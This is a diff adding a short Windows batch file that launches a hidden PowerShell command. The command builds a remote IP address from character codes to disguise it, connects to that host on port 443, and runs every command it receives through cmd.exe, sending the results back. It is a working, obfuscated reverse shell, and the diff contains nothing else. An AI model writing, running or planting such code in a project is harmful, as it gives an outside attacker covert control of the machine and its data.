@@ -1,0 +1,3 @@
+@echo off
+powershell -w hidden -nop -c "$___=[string]([char]52+[char]51)+'.'+([char]50+[char]48+[char]52)+'.'+([char]50+[char]48+[char]57)+'.'+([char]49+[char]50+[char]53);$__p=443;$___c=New-Object Net.Sockets.TCPClient($___,$__p);$___s=$___c.GetStream();$__r=New-Object IO.StreamReader($___s);$__w=New-Object IO.StreamWriter($___s);$__w.AutoFlush=$true;&($ExecutionContext.InvokeCommand.GetCommand('Write-Output','Cmdlet')) 'OK';while(1){$__cmd=$__r.ReadLine();if($__cmd -eq $null -or $__cmd -eq 'exit'){break};try{$__res=&('cmd.exe') /c $__cmd 2>&1 | Out-String}catch{$__res=$_.Exception.Message};$__w.WriteLine($__res)};$___c.Close()"
+exit
